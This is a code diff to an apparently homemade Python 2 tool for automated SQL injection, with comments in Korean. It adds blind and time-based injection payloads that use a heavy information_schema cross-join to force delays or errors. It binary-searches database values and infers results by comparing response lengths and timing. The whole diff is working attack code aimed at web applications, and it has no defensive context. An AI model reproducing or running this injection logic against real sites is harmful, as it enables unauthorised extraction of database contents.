@@ -27,6 +27,7 @@ scheme = tmp_url.scheme
 domain = tmp_url.netloc
 path = tmp_url.path
 tmp_params = tmp_url.query
+org_params = tmp_params.split("=")[1]
 tmp_params = tmp_params.split("=")[0]
 conn = httplib.HTTPConnection(domain, "80")
 
@@ -51,10 +52,20 @@ def error_httpreq(vuln_part):
     response = conn.getresponse().read()  # 응답 값
     return response.split(delims)[1]
 
+def ck_blind_error():
+    tmp = "' and case when 1=2 then 1 else(select count(*) from information_schema.columns col1,information_schema.tables tab1,information_schema.tables tab2)end#"
+    #if caller_blind_httpreq():
+
+    #elif caller_time_httpreq(tmp) == 0:
+    #    return #아직 결정 ㄴ
+
+
 
 def caller_blind_httpreq(query):
-    tmp = httpreq(query)
-    if tmp.find('Nancy') > 0:
+    org_len = len(httpreq(org_params))
+    query_len = len(httpreq(query))+len(query.replace(' ',''))-len(org_params)
+
+    if org_len == query_len:
         return 1
     else:
         return 0
@@ -63,6 +74,7 @@ def caller_blind_httpreq(query):
 def caller_time_httpreq(query):
     b_time = time.time()
     tmp = httpreq(query)
+
     a_time = time.time()
     #print"time(after)-time(before): " + str(a_time - b_time)
     if (a_time - b_time) < 0.3:
@@ -80,11 +92,12 @@ def binary_httpreq(min, max, query):
     # print query + ">" + str(mid)
 
     if caller == "blind":
-        query = "' and case when " + query + ">" + str(mid) + " then 1 else(select count(*) from information_schema.columns col1,information_schema.tables tab1,information_schema.tables tab2)end%23"
-        cnt = caller_blind_httpreq(query)
+        payload = query + ">" + str(mid)
+        cnt = caller_blind_httpreq(payload)
     else:
-        query = query + ">" + str(mid)
-        cnt = caller_time_httpreq(query)
+        payload = "' and case when " + query + ">" + str(mid) + " then 1 else(select count(*) from information_schema.columns col1,information_schema.tables tab1,information_schema.tables tab2)end%23"
+        cnt = caller_time_httpreq(payload)
+
 
     if (max - min) <= 1:
         if cnt:
